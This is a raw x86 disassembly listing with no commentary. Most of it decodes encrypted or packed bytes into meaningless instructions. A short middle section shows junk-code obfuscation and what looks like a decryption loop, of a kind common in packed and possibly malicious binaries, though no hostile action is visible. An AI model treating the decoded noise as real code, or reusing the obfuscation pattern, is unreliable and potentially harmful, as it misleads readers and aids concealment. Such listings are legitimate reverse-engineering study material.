  403e59:	aad    0xc3
  403e5b:	out    0xe6,eax
  403e5d:	rcr    BYTE PTR [edi+0x53],0x52
  403e61:	dec    BYTE PTR [ebx+eax*2+0x0]
  403e65:	and    BYTE PTR [ecx+0x20f85190],ah
  403e6b:	popa   
  403e6c:	int    0xe8
  403e6e:	add    BYTE PTR [eax],dh
  403e70:	jg     0x403e47
  403e72:	xchg   esp,eax
  403e73:	aad    0x79
  403e75:	mov    BYTE PTR [edx],ch
  403e77:	sub    ecx,0xffffff86
  403e7a:	ret    0x5e25
  403e7d:	stc    
  403e7e:	pusha  
  403e7f:	lock jae 0x403e1f
  403e82:	mov    ?,WORD PTR [edi+0x3ba3030a]
  403e88:	popa   
  403e89:	test   eax,0xd3eeeeda
  403e8e:	ret    0xeca
  403e91:	mov    bl,0x30
  403e93:	or     BYTE PTR [ecx],bh
  403e95:	ds cmp eax,0xe3a54f6b
  403e9b:	popa   
  403e9c:	mov    al,ds:0x44ba5b7c
  403ea1:	inc    esi
  403ea2:	fidivr DWORD PTR [edx+0x2661c747]
  403ea8:	outs   dx,BYTE PTR ds:[esi]
  403ea9:	idiv   esp
  403eab:	es dec esp
  403ead:	je     0x403f0f
  403eaf:	outs   dx,DWORD PTR ds:[si]
  403eb1:	das    
  403eb2:	fcomp  DWORD PTR [edi]
  403eb4:	mov    cl,0x12
  403eb7:	mov    al,ds:0x4ad03510
  403ebc:	mov    dl,0x45
  403ebe:	mov    esi,0x93b0dd1f
  403ec3:	sub    BYTE PTR [ebp+0x26b83ba2],0x96
  403eca:	ror    edi,cl
  403ecc:	xor    BYTE PTR [ecx-0x66c723cd],al
  403ed2:	jb     0x403e77
  403ed4:	loop   0x403ece
  403ed6:	pop    ds
  403ed7:	jecxz  0x403ed2
  403ed9:	ja     0x403f27
  403edb:	pushf  
  403edc:	imul   eax,DWORD PTR ds:0x710afabb,0xffffff80
  403ee3:	sbb    edx,DWORD PTR [eax-0x2a]
  403ee6:	mov    ebx,edx
  403ee8:	fld    st(4)
  403eea:	fcmovnu st,st(6)
  403eec:	mov    esp,0x17a9e13f
  403ef1:	inc    edi
  403ef2:	retf   0x270a
  403ef5:	jb     0x403f54
  403ef7:	mov    BYTE PTR [esi],ch
  403ef9:	cld    
  403efa:	push   edx
  403efb:	pop    eax
  403efc:	dec    eax
  403efd:	dec    eax
  403efe:	mov    ah,0x39
  403f00:	jmp    0x433be0bd
  403f05:	int3   
  403f06:	pop    eax
  403f07:	add    al,0x33
  403f09:	(bad)  
  403f0a:	test   al,0xb9
  403f0c:	push   ecx
  403f0d:	or     BYTE PTR [esi+0x64968c05],dl
  403f13:	std    
  403f14:	in     eax,0x7b
  403f16:	inc    ebx
  403f17:	ds fsub st,st(3)
  403f1a:	jl     0x403eed
  403f1c:	jns    0x403eeb
  403f1e:	xchg   bl,dl
  403f20:	push   edx
  403f21:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f23:	shl    DWORD PTR [ecx+0x1e538d7a],1
  403f29:	repnz addr16 pushf 
  403f2c:	add    ebx,esi
  403f2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f2f:	daa    
  403f30:	icebp  
  403f31:	adc    eax,0x585dd83e
  403f36:	in     al,0x13
  403f38:	test   BYTE PTR [esi+0x6e],bl
  403f3b:	mov    ch,0x67
  403f3d:	xor    eax,0xac03c24c
  403f42:	fcmovnbe st,st(2)
  403f44:	(bad)  
  403f46:	mov    dh,BYTE PTR [ebx]
  403f48:	mov    cl,0xdf
  403f4a:	mov    bh,0x9
  403f4c:	xor    al,0x84
  403f4e:	out    0x4a,eax
  403f50:	mov    BYTE PTR [eax-0x57],al
  403f53:	inc    edi
  403f54:	jmp    0x8c57e29b
  403f59:	cs inc edi
  403f5b:	js     0x403f99
  403f5d:	jp     0x403f0b
  403f5f:	jns    0x403fa9
  403f61:	lods   eax,DWORD PTR ds:[esi]
  403f62:	mov    al,ds:0x67123bc3
  403f67:	outs   dx,DWORD PTR ds:[esi]
  403f68:	mov    ah,0x27
  403f6a:	mov    eax,0xccbc95e
  403f6f:	inc    ecx
  403f70:	fucomp st(0)
  403f72:	fmul   DWORD PTR [eax+ebx*8-0x1e]
  403f76:	cmp    BYTE PTR [ecx+0x1b43c8fe],dl
  403f7c:	arpl   WORD PTR [eax],di
  403f7e:	into   
  403f7f:	jbe    0x403ffd
  403f81:	call   0x1c9f:0x39e934df
  403f88:	addr16 mov ah,0x9b
  403f8b:	fucomip st,st(2)
  403f8d:	stos   BYTE PTR es:[edi],al
  403f8e:	xor    eax,0x2e8c633e
  403f93:	mov    eax,0x874e8fd0
  403f98:	ret    
  403f99:	mov    DWORD PTR [esi+0x7d6d20a7],edi
  403f9f:	dec    ebp
  403fa0:	les    eax,FWORD PTR [eax]
  403fa2:	sbb    bh,BYTE PTR [ebp+0x79]
  403fa5:	adc    al,BYTE PTR [esi+0x58d5be95]
  403fab:	push   es
  403fac:	jmp    0x3485:0x5543afdc
  403fb3:	aas    
  403fb4:	mov    ds:0x3548e216,eax
  403fb9:	and    eax,0xe0a1b53e
  403fbe:	push   cs
  403fbf:	jecxz  0x40402d
  403fc1:	dec    eax
  403fc2:	gs lahf 
  403fc4:	outs   dx,DWORD PTR ds:[esi]
  403fc5:	shr    DWORD PTR [edx-0x323c59f2],1
  403fcb:	mov    dh,0x9a
  403fcd:	mov    ecx,0x9d561cea
  403fd2:	hlt    
  403fd3:	(bad)  
  403fd4:	mov    cl,0xc0
  403fd6:	add    al,0x1
  403fd8:	in     eax,dx
  403fd9:	cmp    al,BYTE PTR [edi-0xa]
  403fdc:	jmp    0x403fe4
  403fde:	fdiv   QWORD PTR [edi+0x50]
  403fe1:	pop    ss
  403fe2:	mov    esi,fs
  403fe4:	ror    BYTE PTR [edx+0x3e6ff74b],1
  403fea:	and    BYTE PTR [eax-0x2aaa5b35],al
  403ff0:	mov    ebp,DWORD PTR [eax+ebx*1+0x2f]
  403ff4:	mov    cl,0x5c
  403ff6:	js     0x40405a
  403ff8:	or     al,BYTE PTR [ecx-0x15]
  403ffb:	mov    al,ds:0xe187ab93
  404000:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404001:	outs   dx,DWORD PTR ds:[esi]
  404002:	leave  
  404003:	cli    
  404004:	sbb    eax,DWORD PTR [ebx-0x3a]
  404007:	mul    BYTE PTR [eax+0x465d5995]
  40400d:	jmp    0x7a85:0xc610c2c5
  404014:	add    DWORD PTR [edi+0xc905941],esp
  40401a:	inc    DWORD PTR ds:0xca4d5935
  404020:	jp     0x403fc6
  404022:	mov    dl,0x75
  404024:	push   ebx
  404025:	arpl   WORD PTR [esi-0x20ffdbfd],di
  40402b:	cli    
  40402c:	fadd   st(3),st
  40402e:	ins    DWORD PTR es:[edi],dx
  40402f:	push   edx
  404030:	scas   al,BYTE PTR es:[edi]
  404031:	sbb    esi,DWORD PTR [eax-0x55]
  404034:	ror    BYTE PTR [eax-0x6f],1
  404037:	lods   eax,DWORD PTR ds:[esi]
  404038:	sbb    BYTE PTR [ebx-0x45a7ba39],bh
  40403e:	scas   al,BYTE PTR es:[edi]
  40403f:	lock mov ds:0x9c68e728,al
  404045:	sbb    ah,dl
  404047:	and    eax,0xd0fecbf7
  40404c:	jmp    0x95b1:0x24836102
  404053:	je     0x4040be
  404055:	push   0x826b4207
  40405a:	dec    eax
  40405b:	add    eax,0xe84425f9
  404060:	mov    dh,0x38
  404062:	cmp    eax,0x5d7dcc63
  404067:	bound  ebx,QWORD PTR [esi-0x4f3bf220]
  40406d:	in     al,dx
  40406e:	icebp  
  40406f:	sar    al,1
  404071:	imul   eax,DWORD PTR [esi],0xa3f29cb8
  404077:	aaa    
  404078:	dec    ecx
  404079:	mov    ch,0x22
  40407b:	pop    esi
  40407c:	push   esp
  40407d:	cwde   
  40407e:	enter  0xe589,0x29
  404082:	aaa    
  404083:	sbb    DWORD PTR [esi-0x4f6f03f9],esi
  404089:	xor    bl,bh
  40408b:	and    edi,DWORD PTR [ebx-0x31]
  40408e:	outs   dx,BYTE PTR ds:[esi]
  40408f:	pop    ecx
  404090:	or     edi,0x2b
  404093:	shl    ecx,1
  404095:	cli    
  404096:	push   eax
  404097:	mov    ebp,0x9df4ccd2
  40409c:	imul   edx,DWORD PTR [edx+eax*1+0x2708563],0x2f4254a2
  4040a7:	enter  0x769c,0x82
  4040ab:	pop    ss
  4040ac:	mov    cl,0xb5
  4040ae:	data16 mov dl,0x5a
  4040b1:	xchg   ecx,ebx
  4040b3:	inc    edx
  4040b4:	xor    al,0xb9
  4040b6:	xor    eax,0xea5774fd
  4040bb:	or     al,0x63
  4040bd:	push   cs
  4040be:	mov    edx,0x959574f0
  4040c3:	xchg   edi,eax
  4040c4:	mov    ebp,ecx
  4040c6:	mov    ds:0x35d60b35,eax
  4040cb:	cld    
  4040cc:	push   esp
  4040cd:	sahf   
  4040ce:	jno    0x404099
  4040d0:	std    
  4040d1:	xor    DWORD PTR [ebp+0x485d1523],ebp
  4040d7:	mov    ecx,0xf3b66585
  4040dc:	cmp    DWORD PTR [esi+edi*1-0x74d8ac2],eax
  4040e3:	push   ecx
  4040e4:	xor    eax,0x8fb66a75
  4040e9:	loopne 0x4040e6
  4040eb:	jnp    0x4040fd
  4040ed:	mov    ebx,0xcb143a8b
  4040f2:	inc    esi
  4040f3:	mov    esi,0x584515e5
  4040f8:	(bad)  
  4040f9:	cmc    
  4040fa:	add    al,0xbf
  4040fc:	and    BYTE PTR [ebx-0x2b],bh
  4040ff:	jl     0x4040d9
  404101:	iret   
  404102:	das    
  404103:	int    0xcb
  404105:	add    eax,0xc0caffe5
  40410a:	bound  edx,QWORD PTR [edi+ebp*8-0x34]
  40410e:	inc    ebx
  40410f:	jp     0x4040d9
  404111:	pop    ebp
  404112:	mov    ebx,0x380755bf
  404117:	mov    ds:0xf54ce8dd,al
  40411c:	mov    ds:0xb4e7a249,al
  404121:	or     ecx,DWORD PTR [ecx]
  404123:	sub    ebp,ebx
  404125:	sahf   
  404126:	inc    BYTE PTR [esi+0x2a]
  404129:	sbb    edx,DWORD PTR [ecx]
  40412b:	popf   
  40412c:	out    0xe4,al
  40412e:	jp     0x404199
  404130:	retf   0xf7e8
  404133:	std    
  404134:	lea    edx,[eax+0x7]
  404137:	sub    BYTE PTR [edi-0x48],cl
  40413a:	fidiv  WORD PTR [edx+esi*8-0x494ccb51]
  404141:	call   0x1097:0xbf5c5763
  404148:	xchg   ebp,eax
  404149:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40414a:	sub    edx,DWORD PTR [eax]
  40414c:	les    edi,FWORD PTR [esi]
  40414e:	jle    0x40418b
  404150:	rcr    BYTE PTR [ebx-0x1e],1
  404153:	mov    ah,0xd
  404155:	dec    esi
  404156:	scas   eax,DWORD PTR es:[edi]
  404157:	adc    edi,edi
  404159:	rol    edi,0xa5
  40415c:	jo     0x404159
  40415e:	adc    ecx,ebp
  404160:	adc    dh,ch
  404162:	xlat   BYTE PTR ds:[ebx]
  404163:	(bad)  
  404164:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404165:	popa   
  404166:	sbb    BYTE PTR [ecx-0x56c2ba2f],cl
  40416c:	pop    edx
  40416d:	cmp    BYTE PTR [eax],cl
  40416f:	lock push ss
  404171:	jae    0x4041a7
  404173:	pop    esp
  404174:	fldcw  WORD PTR [esp+eax*2]
  404177:	repnz (bad) 
  404179:	jns    0x4041d0
  40417b:	data16 (bad) 
  40417d:	push   ds
  40417e:	std    
  40417f:	mov    BYTE PTR [ebp-0x4c5a1f38],dl
  404185:	and    al,0xd5
  404187:	ss dec esp
  404189:	cmp    al,0x68
  40418b:	push   ecx
  40418c:	push   ds
  40418d:	pop    es
  40418e:	rcl    cl,cl
  404190:	in     eax,dx
  404191:	sbb    ecx,DWORD PTR [ecx+0x47]
  404194:	jmp    0xeff413db
  404199:	in     eax,dx
  40419a:	ss xor al,0x66
  40419d:	mov    esp,0x60b2a321
  4041a2:	xor    bh,cl
  4041a4:	inc    edi
  4041a5:	push   edi
  4041a6:	mov    eax,DWORD PTR [esi+0x78bf8ad3]
  4041ac:	inc    esp
  4041ad:	dec    esp
  4041ae:	out    dx,al
  4041af:	jmp    0x40418a
  4041b1:	not    ebx
  4041b3:	add    DWORD PTR [eax],edx
  4041b5:	cmp    DWORD PTR ds:0x428415,0x0
  4041bc:	not    ecx
  4041be:	mov    DWORD PTR ds:0x4282d1,0x38eb
  4041c8:	jmp    0x40423c
  4041cd:	mov    edx,DWORD PTR ds:0x42846d
  4041d3:	cmp    DWORD PTR ds:0x428415,0x0
  4041da:	jne    0x40421e
  4041e0:	push   DWORD PTR [ebp-0x1c]
  4041e3:	push   0x3daa
  4041e8:	push   0x6a0e
  4041ed:	call   DWORD PTR ds:0x42dff8
  4041f3:	mov    edx,DWORD PTR ds:0x4283c5
  4041f9:	xor    edx,DWORD PTR ds:0x428501
  4041ff:	mov    DWORD PTR ds:0x4283c5,edx
  404205:	or     edx,DWORD PTR ds:0x4284a1
  40420b:	movzx  edx,WORD PTR ds:0x4283dd
  404212:	and    DWORD PTR ds:0x428401,edx
  404218:	xor    ecx,0x6193
  40421e:	add    edx,0x3a4f
  404224:	add    DWORD PTR ds:0x4283b1,ecx
  40422a:	mov    ecx,DWORD PTR ds:0x42837d
  404230:	mov    edx,DWORD PTR ds:0x4284c1
  404236:	sub    ecx,edx
  404238:	imul   ecx,DWORD PTR [ecx+edx*1]
  40423c:	mov    eax,DWORD PTR [esi]
  40423e:	cmp    DWORD PTR ds:0x428411,0x0
  404245:	mov    DWORD PTR ds:0x428305,0x80f
  40424f:	mov    DWORD PTR ds:0x428509,ecx
  404255:	jmp    0x4042b8
  40425a:	mov    DWORD PTR ds:0x4283bd,0x4518
  404264:	cmp    DWORD PTR ds:0x428411,0x0
  40426b:	jb     0x404293
  404271:	push   DWORD PTR [ebp-0x10]
  404274:	call   DWORD PTR ds:0x42dffc
  40427a:	adc    edx,0x1a1
  404280:	xor    ecx,ecx
  404282:	add    ecx,DWORD PTR ds:0x428451
  404288:	mov    edx,DWORD PTR ds:0x428541
  40428e:	sub    ecx,edx
  404290:	xor    ecx,DWORD PTR [ecx+edx*1]
  404293:	add    DWORD PTR ds:0x4283dd,0x3b89
  40429d:	sbb    DWORD PTR ds:0x428521,ecx
  4042a3:	sub    edx,edx
  4042a5:	movzx  ecx,WORD PTR ds:0x428489
  4042ac:	xor    ecx,DWORD PTR ds:0x4284f9
  4042b2:	mov    DWORD PTR ds:0x428489,ecx
  4042b8:	mov    ecx,DWORD PTR [esi+0x4]
  4042bb:	shrd   eax,ecx,0x2
  4042bf:	shr    ecx,0x2
  4042c2:	cmp    DWORD PTR ds:0x428519,0x0
  4042c9:	mov    DWORD PTR ds:0x428489,ecx
  4042cf:	mov    DWORD PTR ds:0x428419,0x365d
  4042d9:	jmp    0x404321
  4042de:	mov    DWORD PTR ds:0x4283d5,0x759d
  4042e8:	cmp    DWORD PTR ds:0x428519,0x0
  4042ef:	jae    0x404315
  4042f5:	call   DWORD PTR ds:0x42e248
  4042fb:	adc    edx,ecx
  4042fd:	mov    ecx,DWORD PTR ds:0x4283c9
  404303:	and    ecx,DWORD PTR ds:0x428505
  404309:	mov    DWORD PTR ds:0x4283c9,ecx
  40430f:	sbb    edx,DWORD PTR ds:0x428301
  404315:	sbb    DWORD PTR ds:0x4283d9,0x7721
  40431f:	add    ecx,ecx
  404321:	mov    ecx,DWORD PTR [esi]
  404323:	mov    edx,DWORD PTR [esi+0x4]
  404326:	xor    eax,edi
  404328:	shl    ecx,0x1e
  40432b:	xor    edx,edx
  40432d:	or     edx,eax
  40432f:	mov    DWORD PTR [ebp-0x4],edx
  404332:	mov    DWORD PTR [ebp-0x30],0xcb79b576
  404339:	mov    eax,0x9c2b8ae8
  40433e:	mov    DWORD PTR [ebp-0x2c],eax
  404341:	mov    DWORD PTR [ebp-0x20],0xcb79b572
  404348:	mov    DWORD PTR [ebp-0x1c],eax
  40434b:	mov    DWORD PTR [ebp-0x10],0xcb79b57e
  404352:	mov    DWORD PTR [ebp-0xc],eax
  404355:	mov    DWORD PTR [ebp-0x60],0xcb79b57a
  40435c:	mov    DWORD PTR [ebp-0x5c],eax
  40435f:	jmp    0x404700
  404364:	cmp    BYTE PTR [eax+0x14],dh
  404367:	cmp    al,0x9c
  404369:	mov    esp,0xa24d7438
  40436e:	mov    BYTE PTR [ebp+ecx*2-0x42228fb5],ah
  404375:	sti    
  404376:	mov    esi,0xbec4bdbe
  40437b:	mov    esi,0x8a83c1d5
  404380:	scas   eax,DWORD PTR es:[edi]
  404381:	xor    eax,0x6b790ad8
  404386:	popa   
  404387:	cmp    al,0x59
  404389:	mov    ebp,0xfbeb6276
  40438e:	shl    BYTE PTR [eax+0x27],1
  404391:	sbb    BYTE PTR [esi+0x41605b0c],bl
  404397:	cmp    DWORD PTR [edi],ebx
  404399:	fistp  WORD PTR [ebx-0x17b1ad91]
  40439f:	jmp    DWORD PTR [edx+edi*2-0x70]
  4043a3:	add    al,BYTE PTR [edx+0x597ce3e5]
  4043a9:	sbb    al,0x1f
  4043ab:	std    
  4043ac:	push   ecx
  4043ad:	cli    
  4043ae:	(bad)  
  4043af:	or     DWORD PTR [ebx+0x42],ecx
  4043b2:	push   0x325bf252
  4043b7:	aas    
  4043b8:	inc    esi
  4043b9:	(bad)  
  4043ba:	in     al,dx
  4043bb:	cmp    esi,DWORD PTR [eax-0x35]
  4043be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043bf:	sbb    eax,0x5871b755
  4043c4:	fst    DWORD PTR [ecx-0x40]
  4043c7:	dec    eax
  4043c8:	lds    esi,FWORD PTR [ecx+ecx*8+0x46489ccd]
  4043cf:	imul   ebp,DWORD PTR [ebx+0x57],0x98bb8d18
  4043d6:	jno    0x4043fe
  4043d8:	out    0x7c,eax
  4043da:	iret   
  4043db:	jecxz  0x4043c5
  4043dd:	lahf   
  4043de:	adc    ch,BYTE PTR [edi]
  4043e0:	xor    eax,DWORD PTR [ebx+esi*8]
  4043e3:	dec    esp
  4043e4:	mov    esp,0x32cf5bfa
  4043e9:	add    eax,0xff01fea0
  4043ee:	xor    al,0x34
  4043f0:	push   ebp
  4043f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043f2:	and    esp,ecx
  4043f4:	add    ebp,edi
  4043f6:	fabs   
  4043f8:	jo     0x404467
  4043fa:	cdq    
  4043fb:	or     al,0xce
  4043fd:	loopne 0x4043d8
  4043ff:	cmp    edi,DWORD PTR [edx-0x134e5ed0]
  404405:	sub    DWORD PTR [ecx],0xa7fa64a7
  40440b:	jmp    0xb34ee3be
  404410:	sti    
  404411:	jecxz  0x4043de
  404413:	jns    0x404452
  404415:	inc    edi
  404416:	dec    ebp
  404417:	xor    eax,0xf1dd656
  40441c:	lea    esp,[edx-0x4fdcd388]
  404422:	inc    edx
  404423:	call   0x982f616d
  404428:	enter  0x887e,0xc6
  40442c:	jle    0x4043b8
  40442e:	pushf  
  40442f:	pop    ds
  404430:	call   0xcb30:0xa7c760a9
  404437:	popf   
  404438:	mov    edi,0x518efec7
  40443d:	shl    ecx,cl
  40443f:	ja     0x404478
  404441:	dec    esi
  404442:	xor    bl,BYTE PTR [ebp-0x2b428abd]
  404448:	les    ebx,FWORD PTR [ecx-0x7b7fbbe4]
  40444e:	mov    ecx,0x5a861cf4
  404453:	adc    DWORD PTR [ebx+0x22],esi
  404456:	xchg   esi,edx
  404458:	mov    BYTE PTR cs:[ebx-0x10],ch
  40445c:	fucomp st(1)
  40445e:	outs   dx,BYTE PTR ds:[esi]
  40445f:	in     al,0xb5
  404461:	xchg   esi,eax
  404462:	push   0x92385187
  404467:	leave  
  404468:	xor    eax,0x29fb88bb
  40446d:	dec    ecx
  40446e:	push   eax
  40446f:	(bad)  ds:[eax]
  404472:	mov    ah,0x25
  404474:	sub    BYTE PTR [ebx-0x62fe7cd0],dl
  40447a:	adc    BYTE PTR [ecx-0x2e73fd23],bl
  404480:	jle    0x558e29e4
  404486:	jb     0x4044a8
  404488:	sbb    eax,0x1007a304
  40448d:	leave  
  40448e:	mov    eax,ds:0x2d546d64
  404493:	add    BYTE PTR [esi+0x1c],dl
  404496:	mov    ah,0x8a
  404498:	inc    ebx
  404499:	add    eax,0x33fd36b3
  40449e:	and    edx,DWORD PTR [ebx-0x61]
  4044a1:	pop    ds
  4044a2:	or     edi,edx
  4044a4:	sahf   
  4044a5:	nop
  4044a6:	sub    DWORD PTR [edi+esi*8],esp
  4044a9:	inc    ebp
  4044aa:	xor    DWORD PTR [esi+0x7],0xffffff89
  4044ae:	pop    edx
  4044af:	mov    ah,0x3a
  4044b1:	pusha  
  4044b2:	loopne 0x4044a4
  4044b4:	push   eax
  4044b5:	pusha  
  4044b6:	xor    eax,0x8984f566
  4044bb:	sub    eax,0xb83b0ff
  4044c0:	adc    cl,0x9c
  4044c3:	sub    al,BYTE PTR [ebp+0x71]
  4044c6:	inc    ebp
  4044c7:	scas   al,BYTE PTR es:[edi]
  4044c8:	inc    BYTE PTR [ecx+0x7]
  4044cb:	pop    ecx
  4044cc:	repz je 0x4044a5
  4044cf:	aam    0x76
  4044d1:	xchg   DWORD PTR [eax],eax
  4044d3:	sbb    al,BYTE PTR [ebx]
  4044d5:	call   0x9943a88a
  4044da:	mov    bh,0x40
  4044dc:	sub    DWORD PTR [edx+0x7a],eax
  4044df:	push   0x16f375cc
  4044e4:	(bad)  
  4044e5:	aaa    
  4044e6:	jecxz  0x404516
  4044e8:	shr    DWORD PTR [ecx+0x7fc5226d],1
  4044ee:	inc    edi
  4044ef:	and    eax,0xd5317e7e
  4044f4:	jne    0x404554
  4044f6:	imul   ebp,DWORD PTR [eax-0x78],0xe220d7c0
  4044fd:	test   DWORD PTR [ecx-0x44209bc7],0xb1ecb329
  404507:	neg    DWORD PTR [esi+0x20]
  40450a:	add    edi,esi
  40450c:	(bad)  [eax]
  40450e:	sbb    eax,0x2c3c79cd
  404513:	(bad)  
  404514:	or     BYTE PTR ds:0x5ea36498,dl
  40451a:	pushf  
  40451b:	ret    
  40451c:	and    ch,BYTE PTR [esi-0x66246ed7]
  404522:	jmp    0x404512
  404524:	retf   0x7ee
  404527:	dec    eax
  404528:	aas    
  404529:	cmp    cl,BYTE PTR [edi+0x47977dfc]
  40452f:	mov    edi,0x69a810d5
  404534:	es ftst 
  404537:	arpl   WORD PTR [eax+0x4b],cx
  40453a:	dec    ecx
  40453b:	xchg   DWORD PTR [eax-0x5fab9484],eax
  404541:	sbb    ah,BYTE PTR [edi+0x1e0dab06]
  404547:	mov    esp,?
  404549:	bts    DWORD PTR [eax],edi
  40454c:	push   edi
  40454d:	sar    BYTE PTR [edx],cl
  40454f:	dec    esi
  404550:	lods   eax,DWORD PTR ds:[esi]
  404551:	popa   
  404552:	lods   eax,DWORD PTR ds:[esi]
  404553:	and    ebp,DWORD PTR [esi+0x10]
  404556:	xor    ebp,0xaabdc604
  40455c:	pushf  
  40455d:	jl     0x404508
  40455f:	in     eax,0x27
  404561:	call   0xfc7fd113
  404566:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404567:	das    
  404568:	mov    ch,0xcc
  40456a:	push   esi
  40456b:	je     0x4045b2
  40456d:	call   0x3980140d
  404572:	cdq    
  404573:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404574:	push   ebp
  404575:	pop    ebx
  404576:	fldenv [ecx]
  404578:	inc    ecx
  404579:	lods   al,BYTE PTR ds:[esi]
  40457a:	and    al,0xe7
  40457c:	repz ror BYTE PTR [ebx+0xa560da6],cl
  404583:	jecxz  0x40455c
  404585:	sahf   
  404586:	mov    dl,BYTE PTR [edx-0x513122a8]
  40458c:	(bad)  
  40458d:	sar    BYTE PTR [ecx+0x7a385885],cl
  404593:	shl    BYTE PTR [ecx-0x63],1
  404596:	test   DWORD PTR [ecx-0x69d7202d],eax
  40459c:	sub    bl,BYTE PTR [ecx-0x4f5c0043]
  4045a2:	dec    eax
  4045a3:	in     al,dx
  4045a4:	enter  0xaa0d,0xec
  4045a8:	jmp    0x404585
  4045aa:	jmp    0x541:0xf73398a3
  4045b1:	mov    eax,ds:0x9ae97d9b
  4045b6:	mov    ch,0x2c
  4045b8:	mov    bl,BYTE PTR [ebp+0x19]
  4045bb:	pop    ebp
  4045bc:	std    
  4045bd:	aad    0xc4
  4045bf:	retf   0x8409
  4045c2:	dec    edx
  4045c3:	sbb    DWORD PTR [edx+0x7863d95d],esp
  4045c9:	lock addr16 dec esp
  4045cc:	dec    ebp
  4045cd:	sub    ch,BYTE PTR [ecx+0x5c]
  4045d0:	fimul  DWORD PTR [ebx+0x5f]
  4045d3:	js     0x404648
  4045d5:	mov    al,ds:0x10dcd97
  4045da:	add    bh,BYTE PTR [eax+0x6c4a35dc]
  4045e0:	dec    edx
  4045e1:	rcr    bh,1
  4045e3:	adc    DWORD PTR [edx+0x449d8ec6],eax
  4045e9:	lock pushf 
  4045eb:	outs   dx,BYTE PTR ds:[esi]
  4045ec:	push   edi
  4045ed:	push   cs
  4045ee:	push   es
  4045ef:	inc    ebx
  4045f0:	mov    bh,0x75
  4045f2:	or     eax,0x99581833
  4045f7:	out    dx,al
  4045f8:	sub    esp,DWORD PTR [edx+0x5e4affad]
  4045fe:	mov    ds:0xb8c26045,eax
  404603:	dec    ecx
  404604:	ins    BYTE PTR es:[edi],dx
  404605:	aaa    
  404606:	ret    
  404607:	jle    0x4045eb
  404609:	sub    edx,0xbc687be4
  40460f:	fcmove st,st(4)
  404611:	pop    ebp
  404612:	mov    eax,0x67c28fc
  404617:	mov    al,0xab
  404619:	stos   BYTE PTR es:[edi],al
  40461a:	xchg   esp,eax
  40461b:	jns    0x404680
  40461d:	pop    ebp
  40461e:	cmp    al,0x65
  404620:	das    
  404621:	dec    edx
  404622:	sar    DWORD PTR [eax],1
  404624:	lock ins DWORD PTR es:[edi],dx
  404626:	jl     0x404699
  404628:	imul   esp,DWORD PTR [ebp-0x17],0xfffffff5
  40462c:	and    dl,BYTE PTR [ecx+0x14]
  40462f:	push   es
  404630:	div    DWORD PTR [edi+ebx*8]
  404633:	out    0x27,eax
  404635:	pop    esp
  404636:	mov    esp,0xf6bf0ae6
  40463b:	test   al,0xa9
  40463e:	xchg   edi,eax
  40463f:	push   ebx
  404640:	jmp    0x404608
  404642:	popf   
  404643:	imul   eax,DWORD PTR [esi-0x8],0xfffffff8
  404647:	pushf  
  404648:	jae    0x40465a
  40464a:	cmp    al,0xb3
  40464c:	jmp    0x793c68ad
  404651:	push   ds
  404652:	cli    
  404653:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404654:	cmp    ch,dh
  404656:	stc    
  404657:	push   eax
  404658:	(bad)  
  404659:	jno    0x4046d9
  40465b:	stc    
  40465c:	xor    DWORD PTR [eax+0x6],ecx
  40465f:	fmulp  st(7),st
  404661:	adc    eax,0xcf3ce8c4
  404666:	xor    BYTE PTR [esi+0x1eeb0c31],0x1a
  40466d:	dec    ebx
  40466e:	mov    al,0x4
  404670:	cdq    
  404671:	xor    ecx,ebp
  404673:	rol    BYTE PTR [ebx],0x91
  404676:	fs (bad) 
  404678:	in     al,dx
  404679:	dec    esi
  40467a:	dec    edx
  40467b:	cmc    
  40467c:	mov    fs,ecx
  40467e:	nop
  40467f:	ret    
  404680:	fs cmp al,0xe6
  404683:	sub    dl,dl
  404685:	sub    ebp,edx
  404687:	out    dx,al
  404688:	jmp    0x45e97bcc
  40468d:	pop    ss
  40468e:	mov    ebp,0x1270b9c5
  404693:	outs   dx,DWORD PTR ds:[esi]
  404694:	push   esp
  404695:	sub    ebp,DWORD PTR [ebp-0x5a1859ee]
  40469b:	push   0x8fa1edc
  4046a0:	push   esp
  4046a1:	inc    edi
  4046a2:	icebp  
  4046a3:	push   ss
  4046a4:	shl    dh,1
  4046a6:	repz mov ecx,0x6e1cb73d
  4046ac:	cmp    dh,bh
  4046ae:	jns    0x40467e
  4046b0:	add    al,0x2c
  4046b2:	retf   
  4046b3:	data16 cmps BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4046b6:	sti    
  4046b7:	ja     0x4046e8
  4046b9:	push   ebx
  4046ba:	enter  0x5378,0x18
  4046be:	fldz   
  4046c0:	pop    ds
  4046c1:	lods   al,BYTE PTR ds:[esi]
  4046c2:	gs stos BYTE PTR es:[edi],al
  4046c4:	inc    eax
  4046c5:	jae    0x4046f9
  4046c7:	xor    DWORD PTR [ecx-0xc],eax
  4046ca:	inc    esp
  4046cb:	int3   
  4046cc:	pop    edx
  4046cd:	push   cs
  4046ce:	dec    edi
  4046cf:	xchg   esp,eax
  4046d0:	aaa    
  4046d1:	hlt    
  4046d2:	mov    BYTE PTR [ebp+0x45],cl
  4046d5:	popf   
  4046d6:	fstp   DWORD PTR [ecx]
  4046d8:	outs   dx,DWORD PTR ds:[esi]
  4046d9:	mov    ss,WORD PTR [eax]
  4046db:	xor    eax,0x9b13b805
  4046e0:	pop    ds
  4046e1:	adc    BYTE PTR [esp+eax*1-0x70],0xe7
  4046e6:	pushf  
  4046e7:	push   ds
  4046e8:	push   ss
  4046e9:	wbinvd 
  4046eb:	pop    es
  4046ec:	push   edi
  4046ed:	js     0x4046c1
  4046ef:	pop    ecx
  4046f0:	rcl    BYTE PTR [di-0x46a3],0x9e
  4046f6:	test   BYTE PTR [ebx],cl
  4046f8:	jge    0x4046bc
  4046fa:	push   ss
  4046fb:	xor    DWORD PTR [eax+eiz*2+0x458b9164],0xd44d8bd0
  404706:	shrd   eax,ecx,0x2
  40470a:	shr    ecx,0x2
  40470d:	mov    ecx,DWORD PTR [ebp-0x30]
